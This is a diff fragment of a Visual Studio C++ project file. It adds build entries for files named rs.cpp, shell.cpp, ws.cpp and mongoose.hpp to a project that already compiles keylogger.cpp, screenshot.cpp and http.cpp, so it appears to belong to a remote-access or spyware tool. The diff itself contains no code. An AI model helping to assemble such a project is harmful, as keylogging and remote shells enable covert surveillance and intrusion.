@@ -154,13 +154,16 @@
     <ClCompile Include="src\http.cpp" />
     <ClCompile Include="src\keylogger.cpp" />
     <ClCompile Include="src\main.cpp" />
+    <ClCompile Include="src\rs.cpp" />
     <ClCompile Include="src\screenshot.cpp" />
+    <ClCompile Include="src\shell.cpp" />
     <ClCompile Include="src\utils.cpp" />
     <ClCompile Include="src\uuid.cpp" />
+    <ClCompile Include="src\ws.cpp" />
   </ItemGroup>
   <ItemGroup>
+    <ClInclude Include="src\mongoose.hpp" />
     <ClInclude Include="src\pa5a.hpp" />
-    <ClInclude Include="src\utils.hpp" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
